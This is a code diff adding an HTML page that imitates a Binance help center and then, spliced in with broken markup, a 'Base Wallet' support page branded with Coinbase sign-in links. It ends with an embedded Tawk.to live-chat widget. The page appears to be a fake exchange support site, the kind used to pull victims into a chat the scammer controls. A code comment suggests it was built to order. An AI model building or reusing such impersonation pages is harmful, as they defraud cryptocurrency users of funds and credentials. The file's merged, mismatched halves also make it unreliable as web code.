@@ -1,0 +1,431 @@
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Support Center | Binance</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+        
+        body {
+            font-family: 'Inter', system_ui, sans-serif;
+        }
+        
+        .binance-yellow { color: #f0b90b; }
+        
+        .card {
+            transition: all 0.25s ease;
+        }
+        .card:hover {
+            transform: translateY(-3px);
+        }
+        
+        /* MOBILE-FIRST FIXES */
+        .self-service-scroll {
+            scrollbar-width: none;
+        }
+        .self-service-scroll::-webkit-scrollbar {
+            display: none;
+        }
+        
+        @media (max-width: 768px) {
+            .section-title {
+                font-size: 1.35rem;
+            }
+            .welcome-text {
+                font-size: 2.25rem;
+            }
+            .card {
+                min-width: 260px;
+            }
+        }
+    </style>
+</head>
+<body class="bg-[#0a0c14] text-white">
+
+    <!-- Top Warning Bar -->
+    <div class="bg-black py-2 text-center text-xs text-gray-400 border-b border-gray-800 px-4">
+    </div>
+
+    <!-- Navbar -->
+    <header class="bg-[#0f1117] sticky top-0 z-50 border-b border-gray-800">
+        <div class="max-w-screen-2xl mx-auto px-4 py-4 flex items-center justify-between">
+            <!-- Exact logo you requested -->
+            <div class="flex items-center">
+                <img src="https://download.logo.wine/logo/Binance/Binance-Logo.wine.png" 
+                     alt="Binance" 
+                     class="h-9 w-auto">
+            </div>
+
+            <!-- Desktop Nav -->
+            <nav class="hidden md:flex items-center gap-8 text-sm font-medium">
+                <a href="https://www.binance.com/en/trade" target="_blank" class="nav-link">Buy Crypto</a>
+                <a href="https://www.binance.com/en/markets" target="_blank" class="nav-link">Markets</a>
+                <a href="https://www.binance.com/en/trade" target="_blank" class="nav-link">Trade</a>
+                <a href="https://www.binance.com/en/earn" target="_blank" class="nav-link">Earn</a>
+                <a href="https://www.binance.com/en/support" target="_blank" class="nav-link binance-yellow">Support</a>
+            </nav>
+
+            <div class="flex items-center gap-4">
+                <button onclick="document.getElementById('search-input').focus()" class="text-gray-400 hover:text-white">
+                    <i class="fa-solid fa-magnifying-glass text-xl"></i>
+                </button>
+                <a href="https://www.binance.com/en/login" target="_blank" 
+                   class="hidden md:block px-6 py-2 text-sm border border-gray-600 rounded-full hover:border-gray-400">Log In</a>
+                <a href="https://www.binance.com/en/register" target="_blank" 
+                   class="px-6 py-2 text-sm font-semibold bg-[#f0b90b] text-black rounded-full hover:bg-yellow-400">Sign Up</a>
+            </div>
+        </div>
+    </header>
+
+    <div class="max-w-screen-2xl mx-auto px-4 md:px-8 py-8">
+
+        <!-- Welcome -->
+        <div class="text-center mb-10">
+            <h1 class="text-4xl font-light">Welcome To</h1>
+            <div class="flex items-center justify-center gap-3 mt-2">
+                <h2 class="welcome-text text-5xl md:text-6xl font-bold tracking-tighter">Binance Help Center</h2>
+            </div>
+        </div>
+
+        <!-- Search Bar -->
+        <div class="max-w-3xl mx-auto mb-14">
+            <div class="bg-[#1e2026] border border-gray-700 focus-within:border-[#f0b90b] rounded-3xl px-6 py-5 flex items-center gap-4">
+                <i class="fa-solid fa-magnifying-glass text-gray-400 text-xl"></i>
+                <input id="search-input" 
+                       type="text" 
+                       placeholder="Search or ask question" 
+                       onkeyup="if(event.key === 'Enter') handleSearch(this.value)"
+                       class="flex-1 bg-transparent outline-none text-lg placeholder-gray-500">
+            </div>
+        </div>
+/* Header */
+.header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 40px;
+    background: white;
+    border-bottom: 1px solid #e5e5e5;
+}
+
+.logo {
+    font-weight: bold;
+    font-size: 20px;
+    color: #1652f0;
+}
+
+.header-right {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+}
+
+.signin-btn {
+    background: #1652f0;
+    color: white;
+    padding: 8px 18px;
+    border-radius: 20px;
+    text-decoration: none;
+    font-size: 14px;
+}
+
+/* Main */
+.container {
+    text-align: center;
+    padding: 60px 20px;
+}
+
+h1 {
+    font-size: 42px;
+    font-weight: 500;
+    margin-bottom: 30px;
+}
+
+/* Info box */
+.info-box {
+    max-width: 600px;
+    margin: 0 auto 25px;
+    background: #eef2ff;
+    border-radius: 12px;
+    padding: 15px 20px;
+    text-align: left;
+    font-size: 14px;
+}
+
+.info-box a {
+    color: #1652f0;
+    text-decoration: none;
+    margin-left: 10px;
+}
+
+/* Search */
+.search-box {
+    max-width: 600px;
+    margin: 0 auto 25px;
+}
+
+.search-box input {
+    width: 100%;
+    padding: 14px;
+    border-radius: 25px;
+    border: none;
+    outline: none;
+    background: #e9edf3;
+    font-size: 14px;
+}
+
+/* Links */
+.links {
+    max-width: 600px;
+    margin: 0 auto;
+    text-align: left;
+}
+
+.link-item {
+    display: flex;
+    justify-content: space-between;
+    padding: 15px 10px;
+    border-bottom: 1px solid #eee;
+    cursor: pointer;
+}
+
+.link-item:hover {
+    background: #f0f3f7;
+}
+
+/* Footer */
+.footer {
+    background: #f5f7fa;
+    padding: 60px 20px;
+}
+
+.footer-inner {
+    max-width: 1000px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+}
+
+/* Left */
+.footer-left {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    min-width: 200px;
+}
+
+.footer-left .logo {
+    color: #1652f0;
+    font-weight: bold;
+    font-size: 22px;
+}
+
+.footer-left .copyright {
+    color: #6b7280;
+    font-size: 14px;
+}
+
+.footer-left .social {
+    color: #6b7280;
+    font-size: 14px;
+}
+
+/* Columns */
+.footer-columns {
+    display: flex;
+    gap: 100px;
+}
+
+.footer-column {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    font-size: 14px;
+    color: #4b5563;
+    min-width: 160px;
+}
+
+.footer-title {
+    font-weight: 600;
+    margin-bottom: 8px;
+    color: #111;
+}
+
+/* ================= MOBILE FIX ================= */
+@media (max-width: 768px) {
+
+    .header {
+        padding: 12px 16px;
+    }
+
+    .logo {
+        font-size: 16px;
+    }
+
+    .header-right {
+        gap: 10px;
+    }
+
+    .signin-btn {
+        padding: 6px 12px;
+        font-size: 12px;
+    }
+
+    .container {
+        padding: 40px 16px;
+    }
+
+    h1 {
+        font-size: 28px;
+        line-height: 1.3;
+    }
+
+    .info-box {
+        font-size: 13px;
+        padding: 12px;
+    }
+
+    .search-box input {
+        padding: 12px;
+        font-size: 13px;
+    }
+
+    .link-item {
+        padding: 14px 6px;
+        font-size: 14px;
+    }
+
+    .footer-inner {
+        flex-direction: column;
+        gap: 30px;
+    }
+
+    .footer-columns {
+        flex-direction: column;
+        gap: 25px;
+    }
+
+    .footer-column {
+        min-width: unset;
+    }
+
+    .footer-left {
+        gap: 8px;
+    }
+
+    .footer-left .logo {
+        font-size: 20px;
+    }
+}
+</style>
+
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+    <div class="logo">Base Wallet</div>
+    <div class="header-right">
+        <span>⋮</span>
+        <a href="https://login.coinbase.com/signin?" target="_blank" class="signin-btn">Sign in</a>
+    </div>
+</div>
+
+<!-- Main -->
+<div class="container">
+    <h1>Hi there,<br>How can we help?</h1>
+    
+</div>
+    <div class="info-box">
+        <strong>Sign in for the best experience</strong><br>
+        We'll be able to identify your account and resolve your issue more quickly.
+        <a href="https://login.coinbase.com/signin?" target="_blank">Sign in</a>
+        <a href="https://help.coinbase.com/en-gb/cant-sign-in" target="_blank">I can't sign in</a>
+    </div>
+
+    <div class="search-box">
+        <input type="text" placeholder="Search articles">
+    </div>
+
+    <div class="links">
+        <div class="link-item">
+            <span>Self-serve links</span>
+            <span>›</span>
+        </div>
+        <div class="link-item">
+            <span>Ask anything</span>
+            <span>›</span>
+        </div>
+        <div class="link-item">
+            <span>Support by topic</span>
+            <span>›</span>
+        </div>
+        <div class="link-item">
+            <span>Lock or unlock my account</span>
+            <span>›</span>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+    <div class="footer-inner">
+
+        <div class="footer-left">
+            <div class="logo">Base Wallet</div>
+            <div class="copyright">© 2026 Base Wallet</div>
+            <div class="social">
+                <span>Blog</span>
+                <span>•</span>
+                <span>Twitter</span>
+                <span>•</span>
+                <span>Facebook</span>
+            </div>
+        </div>
+
+        <div class="footer-columns">
+
+            <div class="footer-column">
+                <div class="footer-title">Support</div>
+                <div>Submit a complaint</div>
+                <div>Live status</div>
+            </div>
+
+            <div class="footer-column">
+                <div class="footer-title">Legal</div>
+                <div>Legal & Privacy</div>
+                <div>Terms & Conditions</div>
+                <div>Cookie policy</div>
+                <div>Cookie preferences</div>
+                <div>Digital asset disclosures</div>
+            </div>
+
+            <div class="footer-column">
+                <div class="footer-title">Company</div>
+                <div>Careers</div>
+                <div>Affiliates</div>
+                <div>Blog</div>
+                <div>Press</div>
+                <div>Investors</div>
+            </div>
+
+        </div>
+        
+    </div>
+</div>
+    <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/69c6a31f863d011c393cf329/1jknuqdaf';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+</body>
+</html>
